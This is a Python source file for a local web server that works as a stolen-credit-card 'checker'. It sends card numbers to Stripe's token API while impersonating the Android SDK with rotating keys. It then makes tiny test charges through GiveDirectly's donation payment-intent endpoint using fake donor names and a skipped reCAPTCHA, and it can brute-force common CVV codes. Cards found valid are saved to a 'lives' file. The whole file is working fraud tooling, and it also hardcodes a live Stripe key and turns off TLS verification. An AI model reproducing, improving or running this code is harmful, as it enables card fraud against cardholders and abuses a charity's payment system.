import json
import urllib.request
import urllib.parse
import urllib.error
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
import os
import random
import string
import sys
import traceback
import ssl
import uuid
import time
import threading
from datetime import datetime

# Load configuration
CONFIG = {}
try:
    with open('config.json', 'r') as f:
        CONFIG = json.load(f)
except:
    CONFIG = {
        "stripe_keys": ["pk_live_B3imPhpDAew8RzuhaKclN4Kd"],
        "settings": {
            "delay_min_seconds": 5,
            "delay_max_seconds": 15,
            "charge_amount_cents": 50,
            "timeout_seconds": 20,
            "retry_soft_declines": True
        },
        "user_agents": ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"]
    }

# Settings from config
STRIPE_KEYS = CONFIG.get("stripe_keys", ["pk_live_B3imPhpDAew8RzuhaKclN4Kd"])
STRIPE_KEY_INDEX = 0
STRIPE_KEY_LOCK = threading.Lock()
USER_AGENTS = CONFIG.get("user_agents", ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"])
SETTINGS = CONFIG.get("settings", {})

def get_stripe_key():
    """Retrieve the next Stripe key with rotation"""
    global STRIPE_KEY_INDEX
    with STRIPE_KEY_LOCK:
        key = STRIPE_KEYS[STRIPE_KEY_INDEX % len(STRIPE_KEYS)]
        STRIPE_KEY_INDEX += 1
        return key

def get_user_agent():
    """Return a random User-Agent"""
    return random.choice(USER_AGENTS)

def random_delay():
    """Random delay between requests"""
    delay_min = SETTINGS.get("delay_min_seconds", 5)
    delay_max = SETTINGS.get("delay_max_seconds", 15)
    delay = random.uniform(delay_min, delay_max)
    time.sleep(delay)

# Ignore SSL validation issues
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

class CCCheckerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.path = '/index.html'
        
        try:
            path_clean = self.path.split('?')[0]
            if '..' in path_clean:
                self.send_error(403)
                return

            file_path = '.' + path_clean
            if os.path.exists(file_path) and os.path.isfile(file_path):
                if file_path.endswith('.html'):
                    content_type = 'text/html'
                elif file_path.endswith('.js'):
                    content_type = 'application/javascript'
                elif file_path.endswith('.css'):
                    content_type = 'text/css'
                else:
                    content_type = 'text/plain'
                
                with open(file_path, 'rb') as f:
                    content = f.read()
                
                self.send_response(200)
                self.send_header('Content-type', content_type)
                self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
                self.send_header('Pragma', 'no-cache')
                self.send_header('Expires', '0')
                self.end_headers()
                self.wfile.write(content)
            # Endpoint for demo card retrieval
            elif path_clean == '/get_demo_cards':
                try:
                    if os.path.exists('cards.txt'):
                        with open('cards.txt', 'r') as f:
                            content = f.read()
                        self.send_response(200)
                        self.send_header('Content-type', 'text/plain')
                        self.end_headers()
                        self.wfile.write(content.encode('utf-8'))
                    else:
                         self.send_error(404, "cards.txt not found")
                except Exception as e:
                    print(f"Demo Cards Error: {e}")
                    self.send_error(500)
            else:
                self.send_error(404)
        except Exception as e:
            print(f"GET Error: {e}")
            self.send_error(500)

    def do_POST(self):
        # Endpoint for card verification (Android SDK emulation)
        if self.path.endswith('/check_card'):
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length).decode('utf-8')
                params = parse_qs(post_data)
                ccn = params.get('ccn', [''])[0]
                month = params.get('month', [''])[0]
                year = params.get('year', [''])[0]
                cvc = params.get('cvc', [''])[0]

                # Delay before checking (helps avoid rate limiting)
                # Currently disabled for main thread; add worker thread if needed
                # random_delay()
                
                # 1. Create token (Android emulation)
                token_result = self.check_card_android(ccn, month, year, cvc)
                
                # If status is Dead (especially expired) return immediately
                if token_result.get("status") == "Dead":
                    # Stop immediately on any Dead result
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps(token_result).encode('utf-8'))
                    return
                
                # Token created implies the card is Live even if PaymentIntent fails
                if token_result.get("status") == "TokenCreated":
                    token_id = token_result.get("id")
                    
                    # 2. Fetch PaymentIntent (GiveDirectly)
                    try:
                        intent_data = self.fetch_payment_intent()
                        client_secret = intent_data.get("clientSecret")
                        payment_intent_id = intent_data.get("paymentIntent")

                        if not client_secret or not payment_intent_id:
                            # Token exists but PaymentIntent failed to load -> still Live
                            self.send_response(200)
                            self.send_header('Content-type', 'application/json')
                            self.end_headers()
                            self.wfile.write(json.dumps({"status": "Live", "message": "Live - Token Created"}).encode('utf-8'))
                            return

                        # 3. Confirm PaymentIntent
                        confirm_result = self.confirm_payment_intent(payment_intent_id, client_secret, token_id)
                        
                        # Explicitly mark expiration errors coming from confirm() as Dead
                        if confirm_result.get("status") == "Dead" and "expired" in confirm_result.get("message", "").lower():
                            self.send_response(200)
                            self.send_header('Content-type', 'application/json')
                            self.end_headers()
                            self.wfile.write(json.dumps(confirm_result).encode('utf-8'))
                            return
                    except Exception as e:
                        # Token exists but confirm failed -> treat as Live
                        self.send_response(200)
                        self.send_header('Content-type', 'application/json')
                        self.end_headers()
                        self.wfile.write(json.dumps({"status": "Live", "message": "Live - Token Created (confirm error)"}).encode('utf-8'))
                        return
                else:
                    # Token creation failed, return result as-is
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps(token_result).encode('utf-8'))
                    return
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps(confirm_result).encode('utf-8'))
            except Exception as e:
                print(f"Check Card Error: {e}")
                self.send_response(200) # Keep 200 so the frontend can handle the error
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"status": "Unknown", "message": str(e)}).encode('utf-8'))

        # Legacy endpoint for fetching client_secret (kept for compatibility)
        elif self.path.endswith('/get_intent'):
            try:
                intent_data = self.fetch_payment_intent()
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps(intent_data).encode('utf-8'))
            except Exception as e:
                print(f"Intent Error: {e}")
                self.send_response(500)
                self.wfile.write(json.dumps({"error": str(e)}).encode('utf-8'))
                
        # Endpoint for BIN lookup
        elif self.path.endswith('/bin_lookup'):
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length).decode('utf-8')
                params = parse_qs(post_data)
                ccn = params.get('ccn', [''])[0]
                
                bin_info = self.get_bin_info(ccn)
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps(bin_info).encode('utf-8'))
            except Exception as e:
                print(f"BIN Lookup Error: {e}")
                self.send_response(500)

        # Endpoint for persisting Live cards
        elif self.path.endswith('/save_live'):
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length).decode('utf-8')
                params = parse_qs(post_data)
                card_data = params.get('card', [''])[0]
                
                if card_data:
                    with open("lives.txt", "a") as f:
                        f.write(card_data + "\n")
                
                self.send_response(200)
                self.end_headers()
            except Exception as e:
                print(f"Save Live Error: {e}")
                self.send_response(500)

        # Endpoint for client logs
        elif self.path.endswith('/log'):
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length).decode('utf-8')
                print(f"CLIENT LOG: {post_data}")
                self.send_response(200)
                self.end_headers()
            except:
                self.send_error(500)
        else:
             self.send_error(404)

    def check_card_android(self, ccn, month, year, cvc, retry_count=0):
        """Validate a card via Android SDK emulation with enhanced error handling"""
        url = "https://api.stripe.com/v1/tokens"
        
        # Rotate keys
        stripe_key = get_stripe_key()
        
        # Strict expiration validation before hitting Stripe
        try:
            # Normalize month
            exp_month = int(str(month).strip())
            
            # Normalize year (supports YY and YYYY)
            year_str = str(year).strip()
            if len(year_str) == 2:
                exp_year = int("20" + year_str)
            elif len(year_str) == 4:
                exp_year = int(year_str)
            else:
                return {"status": "Dead", "message": "Invalid expiration year format"}
            
            current_year = datetime.now().year
            current_month = datetime.now().month
            
            # Guard against invalid expiration
            if exp_month < 1 or exp_month > 12:
                return {"status": "Dead", "message": "Invalid expiration month"}
            
            # Strict expiration check
            if exp_year < current_year:
                return {"status": "Dead", "message": "Expired card (past year)"}
            elif exp_year == current_year:
                if exp_month < current_month:
                    return {"status": "Dead", "message": "Expired card (past month)"}
                elif exp_month == current_month:
                    # Current month is technically valid, though future is preferable
                    pass
            
        except ValueError as e:
            return {"status": "Dead", "message": f"Invalid expiration format: {str(e)}"}
        except Exception as e:
            return {"status": "Dead", "message": f"Invalid expiration: {str(e)}"}
        
        headers = {
            "Authorization": f"Bearer {stripe_key}",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Stripe/v1 AndroidBindings/20.21.0",
            "X-Stripe-Client-User-Agent": '{"os.name":"android","os.version":"33","bindings.version":"20.21.0","lang":"Java","publisher":"stripe","java.version":"1.8.0_202","http.agent":"Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230901.001)"}',
            "Accept": "application/json"
        }
        
        guid = str(uuid.uuid4())
        muid = str(uuid.uuid4())
        sid = str(uuid.uuid4())
        
        data = {
            "card[number]": ccn,
            "card[exp_month]": str(exp_month),
            "card[exp_year]": str(exp_year),
            "card[cvc]": cvc,
            "guid": guid,
            "muid": muid,
            "sid": sid,
            "payment_user_agent": "stripe-android/20.21.0",
            "key": stripe_key
        }
        
        data_encoded = urllib.parse.urlencode(data).encode('utf-8')
        req = urllib.request.Request(url, data=data_encoded, headers=headers, method="POST")
        
        timeout = SETTINGS.get("timeout_seconds", 20)
        
        try:
            with urllib.request.urlopen(req, context=ctx, timeout=timeout) as response:
                resp_data = json.loads(response.read().decode('utf-8'))
                if 'id' in resp_data:
                    return {"status": "TokenCreated", "id": resp_data['id']}
                else:
                    return {"status": "Unknown", "message": "No ID in response"}
        except urllib.error.HTTPError as e:
            try:
                error_resp = json.loads(e.read().decode('utf-8'))
                error_obj = error_resp.get('error', {})
                error_msg = error_obj.get('message', str(e))
                code = error_obj.get('code', '')
                decline_code = error_obj.get('decline_code', '')
                param = error_obj.get('param', '')
                
                # Interpret only strong indicators of Live status
                
                # Hard Dead: card is definitely invalid or nonexistent
                hard_dead_codes = ['invalid_number', 'incorrect_number', 'expired_card']
                hard_dead_decline_codes = ['lost_card', 'stolen_card', 'pickup_card', 'restricted_card', 'security_violation']
                
                # Fast-path expired cards, always Dead
                if code == 'expired_card':
                    return {"status": "Dead", "message": "Expired card"}
                
                if code in ['invalid_number', 'incorrect_number']:
                    return {"status": "Dead", "message": f"Invalid card number"}
                
                if decline_code in hard_dead_decline_codes:
                    return {"status": "Dead", "message": f"Declined: {decline_code}"}
                
                # Invalid expiration is always Dead
                if param == 'exp_month' or param == 'exp_year':
                    return {"status": "Dead", "message": f"Invalid expiration: {error_msg}"}
                
                # Live indicators: only rely on definitive signals that the card exists
                if code in ['incorrect_cvc', 'invalid_cvc']:
                    # Incorrect CVC still proves the card exists (CCN Live)
                    # Optionally brute-force CVV on soft declines
                    if SETTINGS.get("auto_brute_cvv", False) and retry_count == 0:
                        # Try common CVV combinations
                        common_cvv = ["123", "000", "111", "999", "456", "789"]
                        for test_cvv in common_cvv[:3]:  # Пробуем первые 3
                            if test_cvv != cvc:
                                time.sleep(0.5)
                                retry_result = self.check_card_android(ccn, month, year, test_cvv, retry_count + 1)
                                if retry_result.get("status") == "TokenCreated":
                                    return {"status": "Live", "message": f"CCN Live - CVV Bruted: {test_cvv}"}
                    return {"status": "Live", "message": f"CCN Live - {error_msg}"}
                
                if code == 'insufficient_funds':
                    return {"status": "Live", "message": "Live - Insufficient Funds"}
                
                if code == 'card_declined':
                    if decline_code == 'insufficient_funds':
                        return {"status": "Live", "message": "Live - Insufficient Funds"}
                    elif decline_code in ['incorrect_cvc', 'invalid_cvc']:
                        # Auto-brute CVV
                        if SETTINGS.get("auto_brute_cvv", False) and retry_count == 0:
                            common_cvv = ["123", "000", "111", "999"]
                            for test_cvv in common_cvv[:2]:
                                if test_cvv != cvc:
                                    time.sleep(0.5)
                                    retry_result = self.check_card_android(ccn, month, year, test_cvv, retry_count + 1)
                                    if retry_result.get("status") == "TokenCreated":
                                        return {"status": "Live", "message": f"CCN Live - CVV Bruted: {test_cvv}"}
                        return {"status": "Live", "message": "CCN Live - Incorrect CVC"}
                    elif decline_code == 'generic_decline':
                        # Retry generic declines if setting allows
                        if SETTINGS.get("retry_soft_declines", True) and retry_count < SETTINGS.get("max_retries", 2):
                            time.sleep(1)
                            return self.check_card_android(ccn, month, year, cvc, retry_count + 1)
                        # After retries, generic decline likely means Dead
                        return {"status": "Dead", "message": "Generic Decline (after retry)"}
                    elif decline_code in ['do_not_honor', 'transaction_not_allowed']:
                        # Card exists but issuer blocks the transaction -> Live
                        return {"status": "Live", "message": f"Live - {decline_code}"}
                    else:
                        # Any other decline code without certainty defaults to Dead
                        return {"status": "Dead", "message": f"Declined: {decline_code}"}
                
                # Unknown errors default to Dead in absence of strong Live signals
                return {"status": "Dead", "message": f"{error_msg} ({code})"}
            except Exception as parse_error:
                return {"status": "Dead", "message": f"HTTP Error {e.code}: {str(parse_error)}"}
        except Exception as e:
            return {"status": "Unknown", "message": str(e)}

    def confirm_payment_intent(self, payment_intent_id, client_secret, token_id):
        """Confirm a PaymentIntent with improved 3DS and error handling"""
        url = f"https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm"
        
        # Use the same key family as token creation
        stripe_key = get_stripe_key()
        
        headers = {
            "Authorization": f"Bearer {stripe_key}",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Stripe/v1 AndroidBindings/20.21.0",
            "Accept": "application/json"
        }
        
        # Send token via payment_method_data because Stripe issued a tok_, not pm_
        data = {
            "client_secret": client_secret,
            "payment_method_data[type]": "card",
            "payment_method_data[card][token]": token_id,
            "use_stripe_sdk": "true",
            "return_url": "stripe-js://payment-intent/return-url"
        }
        
        data_encoded = urllib.parse.urlencode(data).encode('utf-8')
        req = urllib.request.Request(url, data=data_encoded, headers=headers, method="POST")
        
        timeout = SETTINGS.get("timeout_seconds", 20)
        
        try:
            with urllib.request.urlopen(req, context=ctx, timeout=timeout) as response:
                resp_data = json.loads(response.read().decode('utf-8'))
                status = resp_data.get('status')
                
                if status == 'succeeded':
                    return {"status": "Live", "message": "Charged Successfully"}
                elif status in ['requires_action', 'requires_source_action']:
                    # Requires 3DS. Card is valid but needs additional authentication
                    return {"status": "3DS", "message": f"Requires 3DS ({status})"}
                elif status == 'requires_capture':
                    # Authorized but needs capture -> Live
                    return {"status": "Live", "message": "Live - Authorized (requires capture)"}
                elif status == 'processing':
                    # Processing means Live
                    return {"status": "Live", "message": "Live - Processing"}
                else:
                    # All other statuses are ambiguous → Unknown
                    return {"status": "Unknown", "message": f"Status: {status}"}
                    
        except urllib.error.HTTPError as e:
            try:
                error_resp = json.loads(e.read().decode('utf-8'))
                error_obj = error_resp.get('error', {})
                error_msg = error_obj.get('message', str(e))
                code = error_obj.get('code', '')
                decline_code = error_obj.get('decline_code', '')
                
                # Proper confirm handling: reaching this stage means token exists
                # Even if confirm fails, the card exists
                if code == 'card_declined':
                    if decline_code == 'insufficient_funds':
                        return {"status": "Live", "message": "Live - Insufficient Funds"}
                    elif decline_code in ['incorrect_cvc', 'invalid_cvc']:
                        return {"status": "Live", "message": "CCN Live - Incorrect CVC"}
                    elif decline_code == 'generic_decline':
                        # Generic decline during confirm still implies Live (token existed)
                        return {"status": "Live", "message": "Live - Generic Decline (token created)"}
                    elif decline_code in ['do_not_honor', 'transaction_not_allowed']:
                        return {"status": "Live", "message": f"Live - {decline_code}"}
                    else:
                        # Any other decline still counts as Live because token succeeded
                        return {"status": "Live", "message": f"Live - Declined: {decline_code} (token created)"}
                elif code in ['incorrect_cvc', 'invalid_cvc']:
                    return {"status": "Live", "message": f"CCN Live - {error_msg}"}
                elif code == 'insufficient_funds':
                    return {"status": "Live", "message": "Live - Insufficient Funds"}
                elif code in ['invalid_number', 'incorrect_number', 'expired_card']:
                    return {"status": "Dead", "message": f"{error_msg}"}
                else:
                    # Unknown errors default to Dead
                    return {"status": "Dead", "message": f"{error_msg} ({code})"}
            except:
                return {"status": "Dead", "message": f"Confirm Error {e.code}"}
        except Exception as e:
            return {"status": "Unknown", "message": str(e)}

    def fetch_payment_intent(self):
        """Fetch a PaymentIntent using low-dollar amounts to minimize fraud score"""
        url = "https://donate.givedirectly.org/payment-intent"
        
        # Generate placeholder donor identity
        letters = string.ascii_lowercase
        first_name = ''.join(random.choice(letters) for i in range(6)).capitalize()
        last_name = ''.join(random.choice(letters) for i in range(8)).capitalize()
        email = f"{first_name.lower()}.{last_name.lower()}@gmail.com"
        
        # Keep amounts small ($0.50-$1.00) to reduce fraud score
        charge_amount = SETTINGS.get("charge_amount_cents", 50)
        charge_max = SETTINGS.get("charge_amount_max_cents", 100)
        cents = random.randint(charge_amount, charge_max)
        
        payload = {
            "cents": cents,  # $0.50-$1.00 for lower fraud score
            "frequency": "once",
            "campaignName": "General",
            "emailAddress": email,
            "firstName": first_name,
            "lastName": last_name,
            "recaptchaResponse": "skip",
            "subscribeToEmailList": False
        }
        
        headers = {
            "User-Agent": get_user_agent(),
            "Content-Type": "application/json",
            "Origin": "https://donate.givedirectly.org",
            "Referer": "https://donate.givedirectly.org/"
        }
        
        req = urllib.request.Request(url, data=json.dumps(payload).encode('utf-8'), headers=headers, method="POST")
        
        timeout = SETTINGS.get("timeout_seconds", 10)
        with urllib.request.urlopen(req, timeout=timeout) as response:
            if response.status == 200:
                return json.loads(response.read().decode('utf-8'))
        raise Exception("Failed to fetch intent")

    def get_bin_info(self, ccn):
        try:
            bin_number = ccn[:6]
            req = urllib.request.Request(
                f'https://data.handyapi.com/bin/{bin_number}',
                headers={"User-Agent": "Mozilla/5.0"}
            )
            with urllib.request.urlopen(req, timeout=5) as response:
                data = json.loads(response.read().decode('utf-8'))
                return {
                    "bank": data.get('Issuer', 'N/A'),
                    "country": data.get('Country', {}).get('A2', 'N/A'),
                    "type": data.get('Type', 'N/A').title(),
                    "brand": data.get('Scheme', 'N/A').title()
                }
        except:
            return {"bank": "N/A", "country": "N/A", "type": "N/A", "brand": "N/A"}

if __name__ == '__main__':
    with open("server_log.txt", "w") as log:
        log.write("Starting server...\n")
    
    print("Initializing server...")
    port = 9000
    try:
        # Bind explicitly to 127.0.0.1
        server = HTTPServer(('127.0.0.1', port), CCCheckerHandler)
        msg = f"Server running on http://127.0.0.1:{port}"
        print(msg)
        with open("server_log.txt", "a") as log:
            log.write(msg + "\n")
        
        print(f"Open http://127.0.0.1:{port} in your browser")
        sys.stdout.flush()
        server.serve_forever()
    except Exception as e:
        error_msg = f"Error starting server: {e}"
        print(error_msg)
        with open("server_log.txt", "a") as log:
            log.write(error_msg + "\n")
            log.write(traceback.format_exc())
        traceback.print_exc()
